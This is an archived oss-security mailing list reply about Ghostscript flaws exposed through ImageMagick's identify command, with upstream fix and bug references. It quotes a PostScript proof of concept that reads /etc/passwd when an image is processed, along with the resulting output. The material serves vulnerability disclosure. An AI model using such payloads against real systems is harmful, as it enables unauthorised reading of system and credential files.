X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1622" "Thursday" "29" "September" "2016" "08:25:54" "+0200" "Florian Weimer" "fw@deneb.enyo.de" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "60" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092906:25:54" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        fw@deneb.eny Sep 29   60/1622  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 30048 invoked by uid 550); 29 Sep 2016 06:26:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30025 invoked from network); 29 Sep 2016 06:26:06 -0000
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
	<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>
	<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
	<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
	<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
In-Reply-To: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
	(Tavis Ormandy's message of "Wed, 28 Sep 2016 13:52:36 -0700")
Message-ID: <877f9vcjd9.fsf@mid.deneb.enyo.de>
MIME-Version: 1.0
Content-Type: text/plain
Date: Thu, 29 Sep 2016 08:25:54 +0200
From: Florian Weimer <fw@deneb.enyo.de>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

* Tavis Ormandy:

> Here is the code I'm testing with (Note: I really don't know much
> postscript - and I hate it).
>
> $ cat test.ps
> /dumpname {
>     dup             % copy filename
>     dup             % copy filename
>     print           % print filename
>     (\n) print      % print newline
>     status          % stat filename
>     {
>         (stat succeeded\n) print
>         ( ctime:) print
>         64 string cvs print
>         ( atime:) print
>         64 string cvs print
>         ( size:) print
>         64 string cvs print
>         ( blocks:) print
>         64 string cvs print
>         (\n) print
>         (\n) print
>     }{
>         (unable to stat\n\n) print
>     } ifelse
>     .libfile        % open as library
>     {
>         (.libfile returned file\n\n) print
>         64 string readstring
>         pop         % discard result (should proably test)
>         print
>         (\n) print
>     }{
>         (.libfile returned string\n) print
>         print
>         (\n) print
>     } ifelse
> } def
>
> (/etc/pass*) /dumpname load 256 string filenameforall

filenameforall was fixed as part of this:

  http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
  http://bugs.ghostscript.com/show_bug.cgi?id=694724

This also covers getenv and has already been assigned CVE-2013-5653.

> $ identify test.ps
> /etc/passwd
> stat succeeded
>  ctime:1474998792 atime:1474998792 size:2662 blocks:8
>
> .libfile returned file

.libfile is not yet fixed upstream.  I reported this upstream:

  http://bugs.ghostscript.com/show_bug.cgi?id=697169
